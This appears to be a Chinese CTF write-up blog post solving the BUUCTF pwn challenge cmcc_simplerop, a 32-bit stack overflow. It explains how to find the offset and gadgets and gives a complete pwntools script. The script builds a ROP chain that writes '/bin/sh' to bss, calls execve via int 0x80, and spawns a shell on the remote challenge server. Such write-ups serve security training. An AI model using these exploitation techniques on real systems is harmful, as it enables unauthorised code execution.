---
title: "BUUCTF Pwn Cmcc_simplerop"
date: 2020-05-18T16:53:03+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Cmcc_simplerop

考点

1、ret2systemcall

2、rop

![image-20200518165649806](D:\Github\myblog\static\images\image-20200518165649806.png)

明显的栈溢出

![image-20200518165743419](D:\Github\myblog\static\images\image-20200518165743419.png)

只开启了NX，程序中没有system和/bin/sh，但是存在int 0x80中断可以执行系统调用，可以用其来构造execve(0xb,"/bin/sh",0,0)，bss段可以写可读，可以rop链调用read写入"/bin/sh\x00\"到bss

![image-20200518170231484](D:\Github\myblog\static\images\image-20200518170231484.png)

![image-20200518170256836](D:\Github\myblog\static\images\image-20200518170256836.png)

![image-20200518170157608](D:\Github\myblog\static\images\image-20200518170157608.png)

execve(0xb,"/bin/sh",0,0)的参数从左往右依次传入eax、ebx、ecx、edx，找满足条件的gadget

![image-20200518170615314](D:\Github\myblog\static\images\image-20200518170615314.png)

本题栈偏移存在个坑点

![image-20200518165649806](D:\Github\myblog\static\images\image-20200518165649806.png)

v4到ebp的offset 0x14，再加上存在leave指令需要覆盖ebp的0x4 = 0x18，但是用pattern测试实际offset是0x20

![image-20200518171135340](D:\Github\myblog\static\images\image-20200518171135340.png)

exp

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'

if args.R:
	sh = remote('node3.buuoj.cn',26098)
else:
	sh = process('./simplerop')
elf = ELF('./simplerop')

#fakerebp = 0x4
#offset = 0x14 + fakerebp

int80_addr = 0x0806eef0 		#0x080493e1
pop_eax = 0x080bae06
pop_edx_ecx_ebx = 0x0806e850
read_addr = elf.symbols['read'] #0x0806cd50
bss_addr = 0x080eaf80
print hex(read_addr)

payload = 'a'*0x20
#这里然read的返回地址为pop_edx_ecx_ebx是为了清空栈空间，从而能继续push系统调用需要的参数
payload += p32(read_addr) + p32(pop_edx_ecx_ebx)
payload += p32(0) + p32(bss_addr) + p32(0x8)
payload += p32(pop_eax)+p32(0xb)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss_addr)
payload += p32(int80_addr)

sh.sendlineafter("Your input :",payload)
sh.sendline("/bin/sh\x00")
sh.sendline("cat flag")
sh.interactive()
```

![image-20200518171423633](D:\Github\myblog\static\images\image-20200518171423633.png)